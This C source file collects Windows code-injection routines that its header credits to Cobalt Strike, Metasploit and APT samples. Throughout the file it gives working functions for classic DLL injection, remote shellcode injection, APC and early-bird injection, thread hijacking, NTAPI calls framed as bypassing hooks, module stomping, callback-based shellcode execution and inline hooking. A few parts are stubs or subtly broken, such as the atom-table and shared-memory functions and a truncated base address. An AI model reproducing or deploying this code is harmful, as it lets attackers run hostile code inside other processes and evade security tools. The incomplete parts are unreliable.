/*
 * Process/DLL Injection - Classic to advanced patterns
 * From Cobalt Strike, Metasploit, APT samples
 */

#include <windows.h>
#include <tlhelp32.h>

// ============================================================================
// CONSTANTS
// ============================================================================

#define PA 0x1F0FFF  // PROCESS_ALL_ACCESS
#define TA 0x1F03FF  // THREAD_ALL_ACCESS
#define CR 0x3000    // MEM_COMMIT | MEM_RESERVE
#define RL 0x8000    // MEM_RELEASE
#define RW 0x04      // PAGE_READWRITE
#define RX 0x20      // PAGE_EXECUTE_READ
#define RWX 0x40     // PAGE_EXECUTE_READWRITE

// ============================================================================
// PROCESS ENUMERATION
// ============================================================================

DWORD gpid(char* n)
{
    HANDLE h = CreateToolhelp32Snapshot(0x2, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};

    if(Process32First(h, &pe)) {
        do {
            if(!_stricmp(pe.szExeFile, n)) {
                CloseHandle(h);
                return pe.th32ProcessID;
            }
        } while(Process32Next(h, &pe));
    }
    CloseHandle(h);
    return 0;
}

// Get thread ID for process
DWORD gtid(DWORD pid)
{
    HANDLE h = CreateToolhelp32Snapshot(0x4, pid);
    THREADENTRY32 te = {sizeof(te)};

    if(Thread32First(h, &te)) {
        do {
            if(te.th32OwnerProcessID == pid) {
                CloseHandle(h);
                return te.th32ThreadID;
            }
        } while(Thread32Next(h, &te));
    }
    CloseHandle(h);
    return 0;
}

// ============================================================================
// CLASSIC DLL INJECTION
// ============================================================================

BOOL dll_inject(DWORD pid, char* dll)
{
    HANDLE h = OpenProcess(PA, 0, pid);
    if(!h) return 0;

    DWORD len = lstrlenA(dll) + 1;
    PVOID p = VirtualAllocEx(h, 0, len, CR, RW);
    if(!p) { CloseHandle(h); return 0; }

    WriteProcessMemory(h, p, dll, len, 0);

    HANDLE t = CreateRemoteThread(h, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32"), "LoadLibraryA"),
        p, 0, 0);

    WaitForSingleObject(t, -1);
    VirtualFreeEx(h, p, 0, RL);
    CloseHandle(t);
    CloseHandle(h);
    return 1;
}

// ============================================================================
// SHELLCODE INJECTION
// ============================================================================

BOOL sc_inject(DWORD pid, BYTE* sc, DWORD len)
{
    HANDLE h = OpenProcess(PA, 0, pid);
    if(!h) return 0;

    PVOID p = VirtualAllocEx(h, 0, len, CR, RWX);
    WriteProcessMemory(h, p, sc, len, 0);

    HANDLE t = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)p, 0, 0, 0);
    CloseHandle(h);

    return t != 0;
}

// Two-stage (RW -> RX)
BOOL sc_inject2(DWORD pid, BYTE* sc, DWORD len)
{
    HANDLE h = OpenProcess(PA, 0, pid);
    if(!h) return 0;

    PVOID p = VirtualAllocEx(h, 0, len, CR, RW);
    WriteProcessMemory(h, p, sc, len, 0);

    DWORD old;
    VirtualProtectEx(h, p, len, RX, &old);

    HANDLE t = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)p, 0, 0, 0);
    CloseHandle(h);

    return t != 0;
}

// ============================================================================
// APC INJECTION
// ============================================================================

BOOL apc_inject(DWORD pid, DWORD tid, BYTE* sc, DWORD len)
{
    HANDLE hp = OpenProcess(PA, 0, pid);
    HANDLE ht = OpenThread(TA, 0, tid);
    if(!hp || !ht) return 0;

    PVOID p = VirtualAllocEx(hp, 0, len, CR, RWX);
    WriteProcessMemory(hp, p, sc, len, 0);

    QueueUserAPC((PAPCFUNC)p, ht, 0);

    CloseHandle(ht);
    CloseHandle(hp);
    return 1;
}

// ============================================================================
// EARLY BIRD INJECTION
// ============================================================================

BOOL earlybird(char* target, BYTE* sc, DWORD len)
{
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    if(!CreateProcessA(target, 0, 0, 0, 0, 0x4, 0, 0, &si, &pi))
        return 0;

    PVOID p = VirtualAllocEx(pi.hProcess, 0, len, CR, RWX);
    WriteProcessMemory(pi.hProcess, p, sc, len, 0);

    QueueUserAPC((PAPCFUNC)p, pi.hThread, 0);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}

// ============================================================================
// THREAD HIJACKING
// ============================================================================

BOOL hijack(DWORD pid, DWORD tid, BYTE* sc, DWORD len)
{
    HANDLE hp = OpenProcess(PA, 0, pid);
    HANDLE ht = OpenThread(TA, 0, tid);
    if(!hp || !ht) return 0;

    PVOID p = VirtualAllocEx(hp, 0, len, CR, RWX);
    WriteProcessMemory(hp, p, sc, len, 0);

    SuspendThread(ht);

    CONTEXT ctx = {0};
    ctx.ContextFlags = 0x10001;
    GetThreadContext(ht, &ctx);

#ifdef _WIN64
    ctx.Rip = (DWORD64)p;
#else
    ctx.Eip = (DWORD)p;
#endif

    SetThreadContext(ht, &ctx);
    ResumeThread(ht);

    CloseHandle(ht);
    CloseHandle(hp);
    return 1;
}

// ============================================================================
// NTAPI INJECTION (bypass hooks)
// ============================================================================

typedef NTSTATUS (NTAPI *t_NtCTE)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

typedef NTSTATUS (NTAPI *t_NtAVM)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS (NTAPI *t_NtWVM)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

BOOL nt_inject(DWORD pid, BYTE* sc, DWORD len)
{
    HMODULE ntdll = GetModuleHandleA("ntdll");
    t_NtAVM NtAVM = (t_NtAVM)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    t_NtWVM NtWVM = (t_NtWVM)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    t_NtCTE NtCTE = (t_NtCTE)GetProcAddress(ntdll, "NtCreateThreadEx");

    HANDLE hp = OpenProcess(PA, 0, pid);
    if(!hp) return 0;

    PVOID p = 0;
    SIZE_T sz = len;

    NtAVM(hp, &p, 0, &sz, CR, RWX);
    NtWVM(hp, p, sc, len, 0);

    HANDLE ht;
    NtCTE(&ht, TA, 0, hp, p, 0, 0, 0, 0, 0, 0);

    CloseHandle(hp);
    return ht != 0;
}

// ============================================================================
// MODULE STOMPING
// ============================================================================

BOOL stomp_inject(DWORD pid, char* dll, BYTE* sc, DWORD len)
{
    HANDLE hp = OpenProcess(PA, 0, pid);
    if(!hp) return 0;

    // Load sacrificial DLL
    DWORD dlen = lstrlenA(dll) + 1;
    PVOID pd = VirtualAllocEx(hp, 0, dlen, CR, RW);
    WriteProcessMemory(hp, pd, dll, dlen, 0);

    HANDLE ht = CreateRemoteThread(hp, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32"), "LoadLibraryA"),
        pd, 0, 0);
    WaitForSingleObject(ht, -1);

    DWORD base;
    GetExitCodeThread(ht, &base);
    CloseHandle(ht);

    // Stomp .text section
    DWORD old;
    VirtualProtectEx(hp, (PVOID)(base + 0x1000), len, RWX, &old);
    WriteProcessMemory(hp, (PVOID)(base + 0x1000), sc, len, 0);

    CreateRemoteThread(hp, 0, 0, (LPTHREAD_START_ROUTINE)(base + 0x1000), 0, 0, 0);

    VirtualFreeEx(hp, pd, 0, RL);
    CloseHandle(hp);
    return 1;
}

// ============================================================================
// CALLBACK EXECUTION (self-injection patterns)
// ============================================================================

void exec_enum(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, CR, RWX);
    __movsb(p, sc, len);
    EnumChildWindows(0, (WNDENUMPROC)p, 0);
}

void exec_enumfonts(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, CR, RWX);
    __movsb(p, sc, len);
    EnumFontsW(GetDC(0), 0, (FONTENUMPROCW)p, 0);
}

void exec_certfind(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, CR, RWX);
    __movsb(p, sc, len);
    // CertEnumSystemStore(0, 0, 0, (PFN_CERT_ENUM_SYSTEM_STORE)p);
}

void exec_fiber(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, CR, RWX);
    __movsb(p, sc, len);
    ConvertThreadToFiber(0);
    PVOID f = CreateFiber(0, (LPFIBER_START_ROUTINE)p, 0);
    SwitchToFiber(f);
}

void exec_pooltp(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, CR, RWX);
    __movsb(p, sc, len);
    // Via thread pool
    PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)p, 0, 0);
    SubmitThreadpoolWork(work);
    WaitForThreadpoolWorkCallbacks(work, 0);
}

// ============================================================================
// VECTORED EXCEPTION HANDLER
// ============================================================================

PVOID g_sc_addr;

LONG CALLBACK veh_handler(EXCEPTION_POINTERS* ep)
{
    if(ep->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
#ifdef _WIN64
        ep->ContextRecord->Rip = (DWORD64)g_sc_addr;
#else
        ep->ContextRecord->Eip = (DWORD)g_sc_addr;
#endif
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void exec_veh(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, CR, RWX);
    __movsb(p, sc, len);

    g_sc_addr = p;
    AddVectoredExceptionHandler(1, veh_handler);

    // Trigger exception
    *(volatile int*)0 = 0;
}

// ============================================================================
// SYSCALL INJECTION (Windows 10+)
// ============================================================================

#ifdef _WIN64

// SSN (System Service Number) - varies by Windows version
#define SSN_NtAllocateVirtualMemory 0x18
#define SSN_NtWriteVirtualMemory    0x3A
#define SSN_NtCreateThreadEx        0xC1

typedef NTSTATUS (NTAPI *t_Syscall)(DWORD ssn, ...);

// Syscall stub template
BYTE syscall_stub[] = {
    0x4C, 0x8B, 0xD1,             // mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, SSN
    0x0F, 0x05,                   // syscall
    0xC3                          // ret
};

#endif

// ============================================================================
// INJECTION VIA ATOM TABLE
// ============================================================================

BOOL atom_inject(DWORD pid, BYTE* sc, DWORD len)
{
    // Store shellcode in global atom table
    // Retrieve via NtQueryInformationAtom in remote process
    ATOM a = GlobalAddAtomA((LPCSTR)sc);
    // ... remote process reads atom content
    GlobalDeleteAtom(a);
    return 1;
}

// ============================================================================
// INJECTION VIA SHARED MEMORY
// ============================================================================

BOOL shared_inject(char* name, BYTE* sc, DWORD len)
{
    // Create named section
    HANDLE hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, 0,
        PAGE_EXECUTE_READWRITE, 0, len, name);

    PVOID p = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, len);
    __movsb(p, sc, len);

    // Remote process opens same mapping and executes
    // HANDLE h = OpenFileMappingA(FILE_MAP_ALL_ACCESS, 0, name);

    return 1;
}

// ============================================================================
// INLINE HOOK INJECTION
// ============================================================================

BOOL hook_inject(DWORD pid, char* fn, BYTE* sc, DWORD len)
{
    HANDLE hp = OpenProcess(PA, 0, pid);
    if(!hp) return 0;

    // Get function address
    HMODULE k32 = GetModuleHandleA("kernel32");
    PVOID pfn = GetProcAddress(k32, fn);

    // Write shellcode to RWX region
    PVOID psc = VirtualAllocEx(hp, 0, len, CR, RWX);
    WriteProcessMemory(hp, psc, sc, len, 0);

    // Create trampoline
    BYTE tramp[14] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp [rip]
        // 8 bytes for address
    };
    *(PVOID*)(tramp + 6) = psc;

    // Patch function
    DWORD old;
    VirtualProtectEx(hp, pfn, sizeof(tramp), RWX, &old);
    WriteProcessMemory(hp, pfn, tramp, sizeof(tramp), 0);
    VirtualProtectEx(hp, pfn, sizeof(tramp), old, &old);

    CloseHandle(hp);
    return 1;
}

// ============================================================================
// EOF
// ============================================================================
